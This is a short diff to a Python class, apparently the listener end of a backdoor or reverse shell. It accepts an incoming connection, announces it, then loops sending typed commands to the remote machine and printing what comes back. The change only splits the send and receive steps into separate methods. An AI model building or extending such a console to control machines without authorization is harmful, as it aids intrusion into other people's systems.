@@ -13,16 +13,20 @@ class back:
         self.connected, addres = listener.accept()
         print("[+] Get a Connection" + str(addres))
 
-    def  command(self,commd):
+    def command_send(self, comnd):
+        self.connected.send(comnd)
+
+    def command(self):
         '''Define a Function'''
-        self.connected.send(commd)
         return self.connected.recv(1024)
+
 
     def run(self):
         '''function number tow'''
         while True:
             user_command = input(">>")
-            re_valu = self.command(user_command.encode())
+            self.command_send(user_command.encode())
+            re_valu = self.command()
             print(re_valu.decode())
 
 
